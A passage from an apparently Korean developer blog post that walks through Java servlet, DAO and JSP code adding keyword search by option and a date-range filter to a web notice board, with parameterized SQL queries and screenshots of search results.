<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">6</span><span class="o">,</span> <span class="n">number</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">from</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">4</span><span class="o">,</span> <span class="n">start</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">5</span><span class="o">,</span> <span class="n">number</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>옵션에 맞는 쿼리문을 만들어 DB 게시글 테이블에 저장된 데이터 수를 알아낸다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시판 목록 수 가져오기</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 1 &lt;= optionVal &lt;= 4</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 1 제목 + 내용</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 2 작성자</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 3 제목</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 4 내용</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getCount</span><span class="o">(</span><span class="kt">int</span> <span class="n">optionVal</span><span class="o">,</span> <span class="nc">String</span> <span class="n">question</span><span class="o">,</span> <span class="kt">long</span> <span class="n">from</span><span class="o">,</span> <span class="kt">long</span> <span class="n">to</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">optionVal</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">optionVal</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// var query = "select count(sid) from notice_board";</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select count(sid) from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%' or main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">2</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (username like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">3</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"  and (gen_time &gt; ? and gen_time &lt; ?)"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">re</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">pstmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="n">cnt</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">cnt</span><span class="o">+=</span><span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h3 id="결과">결과</h3>
<ul>
  <li>작성자 user2 검색결과<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/dc473372-74cd-44ac-8d45-2888a2e46162" alt="Pasted image 20230602032148" /></li>
  <li>작성자 mq 검색결과<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6f259fb9-609f-4acb-bcdf-8d6217611b13" alt="Pasted image 20230602032213" /></li>
  <li>제목+내용 test 검색결과<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c57db689-0bca-4ac3-9f37-3556686c7f4f" alt="Pasted image 20230602032247" /></li>
</ul>

<h2 id="게시글-날짜-지정-검색">게시글 날짜 지정 검색</h2>

<h3 id="목표-1">목표</h3>
<ul>
  <li>날짜 범위를 지정하여 검색을 시도하면 지정된 날짜 사이에 작상된 게시글들을 가지고 온다.</li>
  <li>날짜 형식(yyyy-MM-dd)이 일치하지 않으면 디펄트로 설정된 값을 날짜로 지정한다.</li>
</ul>

<h3 id="날짜-선택창">날짜 선택창</h3>
<ul>
  <li>사용자는 직접 날짜를 선택할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/cf9f6e2e-e771-43e5-8cb8-9546c844f4f4" alt="Pasted image 20230602032643" /></li>
  <li>검색을 누르면 GET 요청으로 날짜가 파라미터에 들어가 서버로 전송된다.<br /><code class="language-plaintext highlighter-rouge">?option_val=1&amp;page=1&amp;q=&amp;date_from=2023-05-18&amp;date_to=2023-06-01</code></li>
</ul>

<h3 id="jsp-코드-1">JSP 코드</h3>

<h4 id="notice_boardjsp-1">notice_board.jsp</h4>
<ul>
  <li>타입이 date인 input 태그들을 추가하였다.</li>
  <li>date_from ~ date_to 사이의 결과를 검색할 수 있다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">id=</span><span class="s">"searchForm"</span><span class="nt">&gt;</span>
... 생략 ... 
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"date"</span> <span class="na">name=</span><span class="s">"date_from"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"date"</span> <span class="na">name=</span><span class="s">"date_to"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"검색"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<h3 id="servlet-코드--java-코드--1">Servlet 코드 ( Java 코드 )</h3>

<h4 id="mainpagejava-1">MainPage.java</h4>
<ul>
  <li>사용자로 부터 date_from,  date_to 값을 받는다.</li>
  <li>유효한 날짜인지 확인한다.</li>
  <li>DB 게시글 테이블에는 게시글 생성날짜가 long 타입으로 저장되어 있다. 따라서 사용자에게 받은 날짜들을 long 타입으로 변환한다.</li>
  <li>검색된 게시글 수, 게시글 목록을 DB 테이블로 부터 가져온다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoard</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span><span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 검색 날짜 범위</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">dateFrom</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"date_from"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">dateTo</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"date_to"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">dateFrom</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">dateTo</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">dateFrom</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">dateTo</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">dateFrom</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)</span> <span class="o">||</span> <span class="n">dateTo</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">dateFrom</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">dateTo</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 날짜 유효한지 검사</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="s">"(19|20)\\d{2}-(0[1-9]|1[012])-(0[1-9]|[12][0-9]|3[01])"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">dateFrom</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">re</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">dateTo</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">re</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">dateFrom</span> <span class="o">=</span> <span class="s">"1980-01-01"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">dateTo</span> <span class="o">=</span> <span class="s">"2999-12-31"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleDateFormat</span><span class="o">(</span><span class="s">"yyyy-MM-dd HH:mm"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">obj</span><span class="o">.</span><span class="na">setTimeZone</span><span class="o">(</span><span class="nc">TimeZone</span><span class="o">.</span><span class="na">getTimeZone</span><span class="o">(</span><span class="s">"Asia/Seoul"</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">from</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">to</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// long type 변환</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">from</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">dateFrom</span><span class="o">+</span><span class="s">" 00:01"</span><span class="o">).</span><span class="na">getTime</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">to</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">dateTo</span><span class="o">+</span><span class="s">" 23:59"</span><span class="o">).</span><span class="na">getTime</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">from</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">to</span> <span class="o">=</span> <span class="nc">Long</span><span class="o">.</span><span class="na">MAX_VALUE</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 검색 결과 총 게시글 수 알아보기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="n">noticeBoardDAO</span><span class="o">.</span><span class="na">getCount</span><span class="o">(</span><span class="n">optionVal</span><span class="o">,</span><span class="n">q</span><span class="o">,</span> <span class="n">from</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 검색 데이터 가져오기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">array</span> <span class="o">=</span> <span class="n">noticeBoardDAO</span><span class="o">.</span><span class="na">getNoticeList</span><span class="o">(</span><span class="n">optionVal</span><span class="o">,</span><span class="n">q</span><span class="o">,</span><span class="n">start</span><span class="o">,</span><span class="n">number</span><span class="o">,</span> <span class="n">from</span><span class="o">,</span> <span class="n">to</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// date from and date to</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"dateFrom"</span><span class="o">,</span> <span class="n">dateFrom</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"dateTo"</span><span class="o">,</span> <span class="n">dateTo</span><span class="o">);</span>
</code></pre></div></div>

<h4 id="noticeboarddaojava-1">NoticeBoardDAO.java</h4>
<ul>
  <li>쿼리문에 생성일 범위를 추가하여 특정 범위에 있는 게시글들을 가지고 온다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Notice</span><span class="o">&gt;</span> <span class="nf">getNoticeList</span><span class="o">(</span><span class="kt">int</span> <span class="n">optionVal</span><span class="o">,</span><span class="nc">String</span> <span class="n">question</span><span class="o">,</span> <span class="kt">int</span> <span class="n">start</span><span class="o">,</span> <span class="kt">int</span> <span class="n">number</span><span class="o">,</span> <span class="kt">long</span> <span class="n">from</span><span class="o">,</span> <span class="kt">long</span> <span class="n">to</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Notice</span><span class="o">&gt;();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select * from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%' or main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">2</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (username like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">3</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 범위</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" and (gen_time &gt; ? and gen_time &lt; ?)"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" order by gen_time desc "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 0번째 부터 5개의 자료만 출력해라.</span>
